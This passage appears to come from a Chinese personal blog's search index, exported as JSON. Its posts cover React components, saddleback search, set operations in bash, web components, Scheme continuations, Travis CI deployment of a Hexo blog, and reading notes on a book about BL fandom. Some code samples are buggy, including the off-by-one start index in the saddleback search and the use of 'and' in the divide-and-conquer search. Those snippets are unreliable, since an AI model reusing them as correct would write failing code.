reducer)\n把狀態與資料放在全域中，這樣大家都看的到，不使用callback或是ref(store)\n用subscribe的方式來讓view知道store更新\n\n這裡就比較貼近原本的MVC，整個流動是一個三角形，\n而web的MVC(model2)，就是一個向上的尖尖，model與view之間的溝通都要透過controller完成\nRedux\n基本上就是Flux，但\n\n只有一個store，所以要拿到狀態與action，要去切出適合的部份給component，沒辦法直接subscribe，所以有所謂的connect\nstate是直接放在參數(如果再改一下，就可以用state monad去包整個reducer)，不像其他是直接改全域變數\n\ncomponent\nclass Clock extends React.Component &#123;  constructor(props) &#123;    super(props);    this.state = &#123;date: new Date()&#125;;  &#125;  componentDidMount() &#123;    this.timerID = setInterval(      () =&gt; this.tick(),      1000    );  &#125;  componentWillUnmount() &#123;    clearInterval(this.timerID);  &#125;  tick() &#123;    this.setState(&#123;      date: new Date()    &#125;);  &#125;  render() &#123;    return (      &lt;div&gt;        &lt;h1&gt;Hello, world!&lt;/h1&gt;        &lt;h2&gt;It is &#123;this.state.date.toLocaleTimeString()&#125;.&lt;/h2&gt;      &lt;/div&gt;    );  &#125;&#125;function Klock(props) &#123;  const [date, setDate] = React.useState(new Date());  let tick = () =&gt; &#123;    setDate(new Date());  &#125;;  React.useEffect(() =&gt; &#123;    this.timerID = setInterval(      () =&gt; tick(),      1000    );    return () =&gt; &#123;      clearInterval(this.timerID);    &#125;;  &#125;);    return (      &lt;div&gt;        &lt;h1&gt;Hello, world!&lt;/h1&gt;        &lt;h2&gt;It is &#123;date.toLocaleTimeString()&#125;.&lt;/h2&gt;      &lt;/div&gt;    )&#125;ReactDOM.render(  &lt;Clock /&gt;,  document.getElementById(&#x27;root&#x27;));\n資料從哪裡來?\n\nprops\nstate\ncontext\n\nprops: 從caller來的資料，就是一般函數的參數\nstate: component自己的資料，就是物件的attribute\ncontext: 可以當成全域變數，但修改值時會限定在一定區域，見Racket的parameter\nlifecycle\n\n\n下一步\n\nReact的CSS\nweb component\n\n","categories":["Javascript","FAQ"]},{"title":"saddleback search algorithm","url":"/2020/12/saddleback-search-algorithm/","content":"動機\nleetcode時被弄過，所以記錄下來\n\n問題\n給定一個2d matrix，行與列都已排序好(小到大)，在這之中找出是否有指定的數字\n1. 暴力\n這沒有應用到已排序的特點，O(n^2)\ndef f(m,target):  for x in m:    for n in x:      if n == target:        return True  return False\n2. 分治\n表格可以分開，又是表格，\n同時分出來的表格都要走過(表格之間不會重疊)，最後再一起看有沒有目標，分治!!\nO(n^1.58)\ndef f(m,target,i=len(m)//2,j=len(m[0])//2):  if not m:    return False  if m[i][j] == target:    return True  elif m[i][j] &lt; target: # 在右手邊    return f(m[i][j+1:],target) and # 右手邊           f(m[i+1:],target) and # 下面           f([x[j+1:] for x in m[:i]], target) # 上面的右手邊  else: # 在左手邊    return f(m[i][:j],target) and # 左手邊           f(m[:i],target) and # 上面           f([x[:j+1] for x in m[i+1:]], target) # 下面的左手邊\n3. saddleback search\n還記得two sum時怎麼移動ptr的嗎?\n比目標大動右邊(範圍的上限變小)，比目標小動左邊(範圍的下限變大)\n這裡也可以做出讓\n\n範圍的上限變小\n範圍的下限變大\n\n的操作嗎?\n從左下開始，如果\n\n太小，往右\n太大，往上\n\nO(N+M)\ndef f(m,target):  i = len(m)  j = 0  while 0 &lt;= i and j &lt; len(m[0]):    if m[i][j] == target:      return True    elif m[i][j] &gt; target:      i -= 1    else:      j += 1  return False\nTODO\n在functional pearl中其實有一篇說到怎麼從 分治 推到 saddleback search，但之後有時間再來看\nRef\nsaddleback\nDivide and Conquer\n","categories":["Algorithm","Classic"]},{"title":"bash上做集合操作","url":"/2020/12/set-in-bash/","content":"動機\n之前為了從log中找出遺失的pid，所以找到了講怎麼用bash做set operation\n超實用，紀錄一下\n\n資料結構\nSet有許多種實做方法，像hash或是array\nbash沒有hash只有array，所以接下去就是看如何用array實現\n這裡就是去重複加排序過就是set\n需要工具\n\n排序: sort -n\n去重複: uniq\n比較: grep, comm\n\ncomm\n會一行一行的比，輸出三個column，\n\n在第一個file有的行\n在第二個file有的行\n在兩個file都有的行\n\n用tab分開，像\n1  2    3\nawk\nSet operation\nUnion\n可以像讓兩個array變成set在合併再轉成一次set\narray =&gt; setarray =&gt; setset * set =&gt; arrayarray =&gt; set\ncat &lt;(sort A | uniq) &lt;(sort B | uniq) | sort | uniq\n或是，先合併再轉成set\narray * array =&gt; arrayarray =&gt; set\ncat A B | sort | uniq\nIntersection\n先合併再取重複\narray * array =&gt; arrayarray =&gt; set\ncat A B | sort -n | uniq -d # d for duplicate# ORcomm -12 &lt;(sort -n A) &lt;(sort -n B) # dont print things only appear in first file or second file\nComplement\ncomm -23 &lt;(sort -n A) &lt;(sort -n B)\nCardinality\n就計數\nsort -n A | uniq | wc -l\nSymmetric Difference\n取只在某一個檔案存在的東西\ncomm -3 &lt;(cat A | sort -n) &lt;(cat B | sort -n) | sed &#x27;s/\\t//g&#x27; | awk &#x27;NF&#x27; | sort -n# awk &#x27;NF&#x27; is for deleting empty lines\nIsSubset\ncomm -23 &lt;(sort subset | uniq) &lt;(sort set | uniq) | head -1\nRef\nSet Operations in the Unix Shell\nrecursion function with awk\n","categories":["Utils","Bash"]},{"title":"signal tracing wrapper","url":"/2020/12/small-signal-wrapper/","content":"動機\n想追到底是誰殺了我的daemon\n\n作法\n就是對每個signal去掛Handler之後紀錄誰發的signal\n真的是個小程式\n遇到的怪事\n這程式會取代原本的執行檔，所以要把這程式自己複製到原本daemon的位置，原本是用fstream去copy，但是不知道為什麼複製過去的檔案的權限少了可執行???\n我在WSL1與WSL2上試都會少可執行權限，十分不解。\n之後用C++17的filesystem的copy與一般的read/write去複製都是正常可以執行的…\nRef\nsource\n","categories":["Small project"]},{"title":"web component","url":"/2020/12/web-component/","content":"動機\nhtml終於可以抽象成一個tag了\n\ntemplate &amp;&amp; shadow DOM\n\nshadow DOM: 可以長出自己的DOM tree的hook點，這樣就可以把整坨html藏起來\ntemplate: 獨立於document之外的DOM tree\n\n&lt;template id=&quot;userCardTemplate&quot;&gt;  &lt;style&gt;...&lt;/style&gt;  &lt;img class=&quot;image&quot;&gt;  &lt;div class=&quot;container&quot;&gt;    &lt;p class=&quot;name&quot;&gt;&lt;/p&gt;    &lt;p class=&quot;email&quot;&gt;&lt;/p&gt;    &lt;button class=&quot;button&quot;&gt;Follow John&lt;/button&gt;  &lt;/div&gt;&lt;/template&gt;\nclass UserCard extends HTMLElement &#123;  constructor() &#123;    super();    var shadow = this.attachShadow( &#123; mode: &#x27;closed&#x27; &#125; ); // shadow DOM 隔開 宿主網頁    var templateElem = document.getElementById(&#x27;userCardTemplate&#x27;);    var content = templateElem.content.cloneNode(true); // clone template    content.querySelector(&#x27;img&#x27;).setAttribute(&#x27;src&#x27;, this.getAttribute(&#x27;image&#x27;)); // 從attr拿資料，但有更好的方法    content.querySelector(&#x27;.container&gt;.name&#x27;).innerText = this.getAttribute(&#x27;name&#x27;);    content.querySelector(&#x27;.container&gt;.email&#x27;).innerText = this.getAttribute(&#x27;email&#x27;);    shadow.appendChild(content);  &#125;&#125;window.customElements.define(&#x27;user-card&#x27;, UserCard);\n&lt;user-card name=&quot;name&quot; email=&quot;123@123.com&quot; src=&quot;123.jpg&quot;&gt;&lt;/user-card&gt;\nedit DOM in template\n基本上就是傳資料就是透過attr，但是如果想傳整個html的話，就要靠一些新功能，slot\n用attr &amp; 自幹\nclass UserCard extends HTMLElement &#123;  constructor() &#123;    super();    var shadow = this.attachShadow( &#123; mode: &#x27;closed&#x27; &#125; ); // shadow DOM 隔開 宿主網頁    var templateElem = document.getElementById(&#x27;userCardTemplate&#x27;);    var content = templateElem.content.cloneNode(true); // clone template    //content.querySelector(&#x27;.container&gt;.name&#x27;).innerText = this.getAttribute(&#x27;name&#x27;);    shadow.appendChild(content);  &#125;   get name() &#123;    return this.getAttribute(&#x27;name&#x27;);  &#125;   set name(value) &#123;    this.setAttribute(&#x27;name&#x27;, value);  &#125;   static get observedAttributes() &#123;    return [&#x27;name&#x27;];  &#125;   attributeChangedCallback(name, oldVal, newVal) &#123;    this.render();  &#125;   render() &#123;    content.querySelector(&#x27;.container&gt;.name&#x27;).innerText = this.name  &#125;&#125;\nslot\n可以把slot想成把一整塊區域替換掉，但是如果是要對template中的dom處理，就還是要回到js\n要注意的是，css是使用當時context中的css，不是說插進去就用template裡面的css (lexical scope)\n&lt;template id=&quot;userCardTemplate&quot;&gt;  &lt;style&gt;...&lt;/style&gt;  &lt;img class=&quot;image&quot;&gt;  &lt;div class=&quot;container&quot;&gt;    &lt;p class=&quot;name&quot;&gt;&lt;slot name=&quot;my-name&quot;&gt;&lt;/slot&gt;&lt;/p&gt;    &lt;p class=&quot;email&quot;&gt;&lt;slot name=&quot;my-email&quot;&gt;&lt;/slot&gt;&lt;/p&gt;    &lt;button class=&quot;button&quot;&gt;Follow John&lt;/button&gt;  &lt;/div&gt;&lt;/template&gt;\nclass UserCard extends HTMLElement &#123;  constructor() &#123;    super();    var shadow = this.attachShadow( &#123; mode: &#x27;closed&#x27; &#125; ); // shadow DOM 隔開 宿主網頁    var templateElem = document.getElementById(&#x27;userCardTemplate&#x27;);    var content = templateElem.content.cloneNode(true); // clone template    content.querySelector(&#x27;img&#x27;).setAttribute(&#x27;src&#x27;, this.getAttribute(&#x27;image&#x27;)); // 從attr拿資料，但有更好的方法    shadow.appendChild(content);  &#125;&#125;window.customElements.define(&#x27;user-card&#x27;, UserCard);\n&lt;user-card src=&quot;123.jpg&quot;&gt;&lt;span slot=&quot;my-name&quot;&gt; name &lt;/span&gt;&lt;span slot=&quot;my-email&quot;&gt; 123@123.com &lt;/span&gt;&lt;/user-card&gt;\nRef\nsource\nadvanced Web Component\n","categories":["Rails","Tips"]},{"title":"The Seasoned Schemer讀後筆記","url":"/2020/4/TSS/","content":"前言\nThe Seasoned Schemer(TSS)的目的是補完TLS中沒有提及的狀態。\n這篇筆記同樣不依照章節順序，用主題式的方式，把我心中的這本書呈現出來。\n行前須知\n知道什麼是?\n\nScheme\n遞迴\n\n\naccumulator parameter\nreverse\n如果要反轉list，在有append情況下可以寫成\n(define (rev l)  (if (null? l)    &#x27;()    (append (rev (cdr l)) (cons (car l) &#x27;()))))\n但我們需要一直append嗎?\n如果我們可以從第一個開始就先cons出來的東西，不就是我們要的。\n(define (rev l acc)  (if (null? l)    acc    (rev (cdr l) (cons (car l) acc))))\n引入acc可以記下我們從頭到目前看過的東西。\nflatten\n同樣在要攤平list時，如果有append可寫成\n(define (atom? x)   (and (not (pair? x))       (not (null? x))))(define (fl lol)  (cond    [(null? lol) &#x27;()]    [(atom? (car lol)) (cons (car lol) (fl (cdr lol)))]    [else (append (fl (car lol)) (fl (cdr lol)))]))\n這裡是不是可以利用剛剛acc可以記下目前看過的東西的特性來改寫呢?\n(define (flat lol acc)  (cond    [(null? lol) acc]    [(atom? (car lol)) (flat (cdr lol) (cons (car lol) acc))]    [else (flat (cdr lol) (flat (car lol) acc))])) ;;先走car，再走cdr\n但是這樣出來的是反的，要記得反轉。\nlet &amp; letrec\n從TLS到現在引入變數不是用define(全域)，不然就是lambda(區域)\n如果想引入區域變數，就要用lambda，且apply值，不過這樣寫起來還蠻難看的。\n所以有let\n(let ((a 10))  (+ a 10))&lt;=&gt;((lambda (a)  (+ a 10)) 10)\n但這樣無法遞迴，如果要遞迴就是用Y組合子，不然就是letrec\n(letrec ((len (lambda (l)                      (if (null? l)                          0                          (+ 1 (len (cdr l)))))))          len)&lt;=&gt;(define len  (lambda (l)    (if (null? l)        0        (+ 1 (len (cdr l))))))\nlet over lambda\n如果把let包在lambda外面會變成像\n(let ((a ...))  (lambda (...)    ...))\n這樣會變成只有這個lambda看的到a，可以用這個手法保護變數。\n還可以搭配set!做出getter與setter，十分OO。\nset!\n一般常見的程式語言中都有改寫變數值的方法。\nScheme也有叫set!\n(define a 10) ;; a is 10(set! a 20);; a is 20\n原本在同一個scope中的變數的資料都是不會變的，現在就被打破了!!\n我們必須意識到與自行安排與管理狀態與時間。\n原本用lambda可以做出List的效果\n(define ((kons a d) f)    (f a d))(define (kar c)    (c (lambda (a d) a)))(define (kdr c)    (c (lambda (a d) d)))\n但現在把set!做到List中，我們只需要set-kdr!\n(define (bons a)    (let ((d &#x27;()))        (lambda (f)          (f (lambda (x) (set! d x))              a d))))(define (kar c)    (c (lambda (s a d) a)))(define (kdr c)    (c (lambda (s a d) d)))(define (set-kdr! c x)    ((c (lambda (s a d) s)) x))(define (kons a d)    (let ((c (bons a)))        (set-kdr! c d)        c))\n有了set-kdr!就可以做出cycle，\n要怎麼找出cycle?\n首先要找出兩個變數是不是一樣，沒有set!之前，只要值相等，這兩個變數就是一樣的．\n但有了set!就不一樣了，所謂的一樣應該是來自同一個地方才對．\n所以相等的也不等於一樣了，如果一樣，set!後應該會同時改變才對．\n(define (same? a b)     (let ((t1 (kdr a))            (t2 (kdr b)))       (set-kdr a 1)       (set-kdr b 2)       (let ((ans (= (kdr a) (kdr b))))        (set-kdr a t1)        (set-kdr b t2)        ans)))(define (same? a b)     (let ((t1 (cdr a))            (t2 (cdr b)))       (set-cdr! a 1)       (set-cdr! b 2)       (let ((ans (= (cdr a) (cdr b))))        (set-cdr! a t1)        (set-cdr! b t2)        ans)))\n如果兩個速度不同的人在cycle中走，那速度快的一定會碰到速度慢的．\n所以讓兩個變數往前走，但速度不同就好，而龜兔賽跑演算法速度給(1,2)．\n(define (finite-len p)    (letcc out        (letrec ((C (lambda (p q)                      (cond                        ((same? p q) (out ‘oops))                        ((null? q) 0)                        ((null? (kdr q)) 1)                        (else (+ (C (kddr p) (kdr q)) 2)))                 (kddr (lambda (x) (kdr (kdr x))))))    (if (null? p)        0        (add1 (C p (kdr p)))))))(define (finite-len l)  (call-with-current-continuation   (lambda (oops)     (define (F a b)       (cond         ((null? b) 0)         ((same? a b) (oops &#x27;no))         (else          (+ 1 (F (cdr a) (cddr b))))))     (cond       ((null? l) 0)       ((null? (cdr l)) 1)       (else        (+ 1 (F l (cdr l))))))))\n(0,1) - (+2,+1) -&gt; (2,2)\nletrec &amp; let &amp; set!\n為什麼let引入的變數沒辦法遞迴?\n因為在lambda中其實看不到遞迴的那個變數。\n所以在Y組合子的遞迴函數那邊才會多一個接收另一個函數的參數。\n那多了set!的現在，能不能簡單的完成遞迴?(在沒有define的狀態下)\n先引入遞迴函數的名字(let)，再用看的到該名字的lambda改寫變數(set!)\n(let ((len &#x27;whatever))  (set! len (lambda (l)                    (if (null? l)                        0                        (+ 1 (len (cdr l))))))  len)&lt;=&gt;(define len  (lambda (l)    (if (null? l)        0        (+ 1 (len (cdr l))))))&lt;=&gt;(letrec ((len (lambda (l)                      (if (null? l)                          0                          (+ 1 (len (cdr l)))))))          len)\nY!\n有了set!可以有新的遞迴產生方法，那能不能有新的Y組合子?\n從len開始看。\n(define len  (lambda (l)    (if (null? l)        0        (+ 1 (len (cdr l))))))\n用剛剛的方式改寫\n(define len  (let ((len2 &#x27;whatever))    (set! len2 (lambda (l)                      (if (null? l)                          0                          (+ 1 (len2 (cdr l)))))) ;; !!    len2))\nlambda與len2綁在一起，我們必須要抽出來\n(define len  (let ((len2 &#x27;whatever))    (set! len2 (lambda (f) ;; !!                  (lambda (l)                      (if (null? l)                          0                          (+ 1 (f (cdr l)))))) ;; !!    len2))\nf必須是個可以碰到len2的函數，來把參數丟進去。\n(define len  (let ((len2 &#x27;whatever))    (set! len2 ((lambda (f)                  (lambda (l)                      (if (null? l)                          0                          (+ 1 (f (cdr l))))))                (lambda (arg) (len2 arg)))    len2))\n熟悉的東西出來了，抽出來。\n(define lenMK  (lambda (f)    (lambda (l)        (if (null? l)            0            (+ 1 (f (cdr l)))))))(define (Y! mk)  (let ((len2 &#x27;whatever))    (set! len2 (mk                (lambda (arg) (len2 arg)))    len2)))(define len (Y! lenMK))\ncontinuation\n\ncontinuation可以想像成代辦事項或是Program conuter，也許會比較好想像一點。\n如果改變continuation的內容，可以讓原本的程式跑去做別的事，一去不復返，或是再回來同一個地方。\n\ncontinuation可以當成C語言中的label，調用continuation就是用jump。\n但與label不同的是這是可以存在變數的label!!\nescape from here\n連乘List中的數字\n(define (fac l)  (if (null? l)      1      (* (car l) (fac (cdr l)))))\n不過如果中間有0的話應該不用繼續做下去，要直接跳出去。\n那我們應該可以用continuation來跳出去，只要continuation在程式的外面就ok了\n(define call/cc call-with-current-continuation)(define (fac l)  (call/cc (lambda (escape)    (define (fac2 l)      (cond        [(null? l) 1]        [(zero? (car l)) (escape 0)]        [else (* (car l) (fac2 (cdr l)))]))    (fac2 l))))\n一旦調用了escape整個call/cc的回傳值會變成傳入escape中的資料。\n如果沒有用到escape call/cc的部分就像不存在一樣。\ngo back to here\n(define return 0)(define resume 0)(define (walk* lol)  (cond    ((null? lol)      &#x27;empty)    ((atom? (car lol))      (call/cc (lambda (here)        (set! resume here)        (return (car lol))))      (walk* (cdr lol)))    (else      (walk* (car lol))      (walk* (cdr lol)))))(define (get-next)  (call/cc (lambda (here)    (set! return here)    (resume &#x27;whatever))))(define (loop old)      (if (eq? old &#x27;nothing)          #f          (let ((secend-one (get-next)))            (if (eq? secend-one old)                #t                (loop secend-one)))))(define (two* lol)  (let ((first-one          (call/cc (lambda (here)            (set! return here)            (walk* lol)            (return &#x27;nothing)))))      (loop first-one)))\niteraor &amp; set! &amp; define\n\ndefine 可以當成lambda引入新的變數(參數)\nset! 視為partial apply 來自define的參數\n\n;; [LISTOF X] -&gt; ( -&gt; X u &#x27;you-fell-off-the-end)(define (generate-one-element-at-a-time lst)  ;; Hand the next item from a-list to &quot;return&quot; or an end-of-list marker  (define (control-state return)    (for-each      (lambda (element)               (set! return (call-with-current-continuation                              (lambda (resume-here)                                ;; Grab the current continuation                               (set! control-state resume-here)                               (return element)))))     lst)    (return &#x27;you-fell-off-the-end))    ;; (-&gt; X u &#x27;you-fell-off-the-end)  ;; This is the actual generator, producing one item from a-list at a time  (define (generator)    (call-with-current-continuation control-state))  ;; Return the generator   generator)(define generate-digit  (generate-one-element-at-a-time &#x27;(0 1 2)))\n陰陽謎題\n(define (now)  (call-with-current-continuation (lambda (c) c)))(let* ((yin         (let ((cc (now)))          (display #\\@)          cc))       (yang          (let ((cc (now)))            (display #\\*)            cc)))    (yin yang))\n一開始會印出@*\n再來會跳回去yin的call/cc，所以此時的yin是上一次的yang(第一個)，所以新出現的yang(第二個)會apply到第一個yang去，所以會再多印一個*，所以總共印@**\n在這裏第二個yang透過原本的yin跳回去印@，再產生第三個yang再印一個*，如此重複\n在每一次的循環中產生新的yang，所以經過每一次的循環都會多一個*\n略過的部分\n\n直譯器\n直譯器等到以後打EoPL與LiSP的心得再說。\n\n","categories":["Lisp","Reading"]},{"title":"用travisCI自動部屬github page","url":"/2020/4/auto-deploy-blog-with-travisCI/","content":"動機\n不想打那麼多指令，讓CI代勞吧\n\nrepo\n\npublic: &lt;username&gt;/&lt;username&gt;.github.io\nprivate: &lt;username&gt;/blogSource\n\npublic放hexo生成的檔案，private放hexo的source code\nmirror tweaked NexT theme\n把改過的theme放到github上，等等就可以用submodule與自己的blog repo連接在一起\ngit push --mirror git@github.com:&lt;username&gt;/theme-next.gitgit remote set-url origin git@github.com:&lt;username&gt;/theme-next.git\nsetup travis CI\n1. 寫下.travis.yml，並放到blog的root folder\n可以設定repo與target_branch指定生完的檔案要放到那個repo\n這意味著\n可以把source code放到private repo!!\nsudo: falselanguage: node_jsnode_js:  - nodecache: npmbranches:  only:    - masterscript:  - hexo generatedeploy:  provider: pages  skip-cleanup: true  github-token: $GH_TOKEN  keep-history: true  repo: &lt;username&gt;/&lt;username&gt;.github.io #生出來的檔案要放到的repo  target_branch: master #生出來的檔案要放到的branch  on:    branch: master  local-dir: public\n2. 設定GH_TOKEN\n\ndeploy\n設定blog的repo，如果前面設定的沒錯，github.io就會有網站了\ngit initgit submodule add https://github.com/&lt;username&gt;/theme-next themes/nextgit add .git commit -m &quot;...&quot;git remote add origin git@github.com:&lt;username&gt;/blogSource.gitgit push -u origin master\nRef\nsubmodule\ndeploy with TravisCI\nnice tutorial\nmirror Git repo\ngh-pages deploy conf\n","categories":["Utils","Small project","CI","Tips"]},{"title":"自動瑱入post的創造時間","url":"/2020/4/auto-replace-post-created-time/","content":"動機\n如果在github上寫文章，但是不想打date阿 (懶)\n同時想玩玩travisCI (齁勝)\n\n用法\n不想打2020-04-15 23:58:57之類的字串的地方改打特定字串，像__TIME__\n作法\n在travisCI的lifecycle中有after_success與after_failure區分，當script的exit code不為0的動作\n當script的exit code不為0時，就會觸動after_failure，而只要在這裡面再push一次就可以再觸發travisCI\n這樣就可以把剩下要產生的檔案生完!!\n所以只要讓script的exit code在md檔有__TIME__時，exit code不為0就好了\ncode\nos: linuxdist: xeniallanguage: node_jsnode_js:  - nodecache: npmbranches:  only:    - masterbefore_script:  - export TZ=&#x27;Asia/Taipei&#x27;  - CREATEDS=$(find source/_posts/ -ctime -1 | grep \\.md$)script:  - (! grep -q __TIME__ $CREATEDS) # return exit 1 when files containing __TIME__after_success:  - git checkout master # avoid detached HEAD  - hexo generateafter_failure:  - git checkout master # avoid detached HEAD  - sed -i &quot;s/__TIME__/$(date +&quot;%Y-%m-%d %H:%M:%S&quot;)/g&quot; $CREATEDS  - git remote set-url origin https://$GH_TOKEN@github.com/&lt;username&gt;/blogSource  - git add .  - git commit -m &quot;replace __TIME__ with $(date +&quot;%Y-%m-%d %H:%M:%S&quot;)&quot;  - git push origin masterdeploy:  strategy: git  provider: pages  cleanup: false  token: $GH_TOKEN  keep_history: true  repo: &lt;username&gt;/&lt;username&gt;.github.io  target_branch: master  on:    branch: master  local_dir: public\nRef\nTravis Lifecycle\n","categories":["Utils","Small project","CI","Tips"]},{"title":"爺們的BL：閃亮腐海就讓宅宅大叔帶你探索 讀後筆記","url":"/2020/4/boys-BL/","content":"看到鉛筆與橡皮擦，你會想到什麼\nBL腦補的兩個必要條件\n\n將兩個角色(擬人化的也算)的關係解釋成戀愛關係\n兩者必須都是男性角色\n\nBL腦補的作法\n\n先對角色性格的解釋進行補充修正 (哪方比較有男子氣概)\n構築兩者之間的關係 (他們如何看待彼此)\n\n以此決定哪一方在精神上佔有優勢\n哪一方處於接受的立場\n被動的一方是單純的接受，還是想像成有包容力等\n\n\n\nBL腦補的開始\n\n誰在精神上佔優勢\n實在戀愛時佔上風\n誰有哪種自卑情結\n如何【注意】對方\n\nBL &amp; Yaoi 的定義\nBL: 描繪男性之間戀愛的原創作品\nYaoi: 將原創作品中的角色關係解讀為戀愛關係的心理活動或創作活動\nYaoi的魅力: 自己從作品中找出萌角\nBL則是對象與想像都具體呈現在眼前\n解讀\n對象與主體的混淆\n\n作品 - 萌的【對象】發生什麼事\n\n對象上發生什麼事\n作品中發生什麼事\n\n\n解讀 - 從對象身上產生萌感的【我】發生什麼事\n\n各種讀法\n\n少女心讀法: 與主角產生共鳴，把自己置換為主角 (登入型)\n腐女子讀法: 想像角色之間不可能發生的關係\nBL讀法: 難性之間的戀愛是必要挑建，在作品中已經是戀愛關係了。\n\n角色萌與關係萌的混淆\n你喜歡的是\n\n個體/角色本身 OR\n兩個人之間的關係\n\n愛角色的方式\n\n帶入角色(那個角色:成為、被愛，別的角色:去愛他)\n對角色做…，看反應\n純觀察\n\n關係\n\n年齡\n外型\n社會角色\n日常/夜晚\n\n讀法的組合\n帶入到 * 想像嗎(BL:不想像,Yaoi:想像) * 主動嗎(純觀察於否)\n帶入到\n\n愛的角色\n對手\n他人\n不到任何人\n\n可逆/不可逆\n不可逆: 喜歡的是關係(社會關係)\n可逆: 喜歡的是兩人之間的牽絆 &lt;= 純愛主義者\nBL =&gt; 純愛: 你是唯一\n電影評論與Yaoi\n以理性的評論最為解釋對象的手法\n以感性的行為作出名為想像的創作\n人物關係圖\n每個人都要有(角色戲份越重要問越多)\n\n【A眼中的B是什麼樣的?A如何看待B?】\n【氫元素是這樣的元素，鎳元素是這樣的元素，所以氫元素對鎳元素的看法一定是這樣沒錯】，而非【氫元素對鎳元素有什麼看法】\n\n還有周遭世界的縝密設定\n為什麼是男男\n少女漫畫一定要\n一邊瞄寫男女情感，並且盡力切割性欲要素\n喜歡百合的理由\n\n男性很礙事，一旦是男女關係救回被拉回現實\n描寫男女關係的作品，心中會出現【我有沒女友】，【我有沒辦法像情侶一樣】，像是gal中的選項沒有自己想說的話一樣 =&gt; 【我跟他不一樣】\n\n為什麼是同性不可\n男女關係中【接受】的一方是確定的\n為什麼是男性不可\n\n可以和【(一部分的)性欲】切割=與【萌】文化的共通處=柏拉圖式戀愛=【純愛物語】\n男人受傷也無所謂\n男人無論精神或肉體都不是【楚楚可憐】的\n可以看到男人【有感覺】的樣子\n可以看到男人苦惱的樣子 (=基本上與【萌】共通)\n享受把男人放進【小小世界】的樂趣(身為支配者的喜悅、【消費】男人、觸動母性…)\n\n\n因為喜歡你的內在所以愛上你。我其實不也不是不喜歡女人，但還是你比較好\n\n男人受傷也無所謂?\nin my opinion, 受傷是可以使用在男人上的證明 (角色為了得到什麼，而要付出的過程)\n女性多BL?\n\n從少女漫畫產生\n\n主角的性別相同(很難不帶入這邊)\n到最後女性都是接受的一方\n最後產生【我跟他不一樣】\n\n\n現實感過強\n\nSo, 女性想在BL中得到?\n\n將【憧憬的戀愛】【憧憬的關係】投射其中\n想身為第三者，以局外人的身分【在一旁守護到最後】\n藉由【創造(想像)者】或的成就感，滿足【想加油添醋】的心情\n\nBL作為女性想法的反射\n\n男人是這樣想的吧 (感情上)\n自己喜歡被這樣對待 (床上)\n\n用愛情觀來解釋男人的【友情】\n\n明明感情很差，卻又互相認同對方\n想法明明完全和不來，但經常一起喝酒\n在學校中是競爭對手，總是很在意對方，感情不睦，可是眼裡總是看著對方\n\n因為不知道要怎麼解釋這種關係，所以用愛情關係來解釋\n還有女性都很喜歡戀愛話題\n萌 的定義 (叫少女心比較貼切)\n【雖然沒有色情要素，但我絕對全面支持 OOO ，不管誰怎麼想，為了她的幸福我什麼都願意做】\nin my opinion, 這個定義已經很接近一般的少女心了\n而這個定義有解釋到【不懂規則又有什麼關係，看他們那麼努力就夠了】\n【王牌投手】是一部有指標性的作品\n從少女心到母性: 兩者的差異\n加油 (好壞都可，有努力就好) -&gt; 希望他好好的\n萌到BL的連續過程\n在一個【自己不存在的世界】，讓【可愛的存在】療癒自己\n故在此 可愛 的定義很重要\n【可愛的萌角色】-&gt;【男孩子氣的女生】-&gt;【偽娘】-&gt;【正太】-&gt;【可愛的男生】-&gt;【型男可愛的一面】-&gt;【有點崩壞的(老)男人脆弱的一面很可愛】-&gt;【連壯漢歐吉桑也覺得很可愛】\n在日本 可愛 的定義\n欣賞事物的缺點與弱點 =&gt; 與【留白】、【不完整性】、【省略】等都是一樣的道理\n腐男子不是GAY\n性別就是一種屬性，類似貓耳等\n萌與性不同\n也與戀愛不同\n見下方的定義\n萌 的定義\n觀察，非刻意的窺視，從而得知不為人知的一面，並因此得到喜悅\n呼應萌與戀愛不同，觀察對象不是戀愛對象\n少女心/帥氣 &lt;=&gt; 喜歡/欣賞 TODO\n少女心(想保護、加油) / 帥氣(爭取)\n喜歡/欣賞 =&gt; 自身的稀缺、追求\n你所堅持的萌點是?\n\n比朋友更深的關係，但又還不到戀人的地步，絕妙的距離感\n異性也好同性也好，希望聯繫彼此關係的是【獨一無二的理由】，無論是好是壞都喜歡\n眼鏡、保力、攻君面前的受君，低級的(嘴臭) =&gt; 想看不常見的\n共犯關係、無血緣關係的兄弟、老師與學生、模擬家人 =&gt; 隱密性強的關係、【朋友以上戀人以上家人未滿】\n享受角色闖入別人心中或揭開別人瘡疤的樂趣\n僧侶 =&gt; 反差感\n美國西岸的高中生活 =&gt; 幻想世界、另一個世界\n【名偵探x助手】的組合 =&gt; 技士主從關係，又存在著對彼此的信賴\n乍看之下狂妄任性的【大爺】角色，其實內心纖細敏感，比受君還少女心的攻君。進可攻，退可受的美味角色\n【只要有這人在就放心了】的信任感 =&gt; 安全感\n反差大的角色，看起來冷酷，卻似乎有許多孩子氣的地方 =&gt; 和不同對象在一起時展現令人意外的一面\n青梅竹馬 - 認識者麼久卻發現對方有自己不知道的事，從這裡感情又出現進展。明明在一起這麼久卻有新發現\n令人捉摸不定的攻x老實認真的受\n摯友、競爭對手、老夫老妻\n【攻超愛受】。攻最好是在一般人眼中【立場比較低】的人，這樣地位才會對等 =&gt; 逃避男女關係與社會階級\n兩人個性與思考正好相反的設定，即使彼此無法理解，卻又強烈嚮往對方。分不清是愛戀還是崇拜。 =&gt; 來自自卑的萌，故事在為對方克服自卑會受到對方肯定之中得到發展\n\n附錄\n男的如何看男的床戲\n當成戀情成就之後的禮物，床戲是證明對方很重要的禮物，同時看他們在床上會用什麼姿勢\n入坑的理由\n口耳相傳最多\ntoread\nBL入門書\n中村春菊: 純情羅曼史、世界第一初戀\n中村明日美子: 同級生系列\n水城雪可奈: 愛在末路之時、愛在絕境重生\nfurther reading\nBL進化論──男子愛可以改變世界！日本首席BL專家的社會觀察與歷史研究\n輕BL讀本\nオトコのカラダはキモチいい\n美少年学入門\n腐女子化する世界―東池袋のオタク女子たち\n大人は判ってくれない―野火ノビタ批評集成\nオタク女子研究 腐女子思想大系\n密やかな教育: 〈やおい・ボーイズラブ〉前史\n世界ボーイズラブ大全 「耽美」と「少年愛」と「悦楽」の罠\nはじめての人のためのBLガイド\n腐女子あるある\n男子はみんなBL! 腐女子の目撃体験\n","categories":["Reading"]},{"title":"在windows直接算md5","url":"/2020/4/compute-md5sum-on-windows-without-installing-any-program/","content":"CertUtil -hashfile \\&lt;filename\\&gt; 